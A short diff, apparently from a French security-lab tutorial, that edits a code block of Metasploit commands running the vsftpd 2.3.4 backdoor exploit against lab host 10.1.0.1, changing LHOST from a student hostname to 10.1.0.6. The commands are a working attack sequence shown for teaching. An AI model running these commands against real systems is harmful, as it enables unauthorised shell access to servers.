@@ -40,7 +40,7 @@ La commande `info exploit/unix/ftp/vsftpd_234_backdoor` détaille l'origine de l
 ```text
 msf6 > use 0
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.1.0.1
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST etudiant5
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 10.1.0.6
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 ```
 
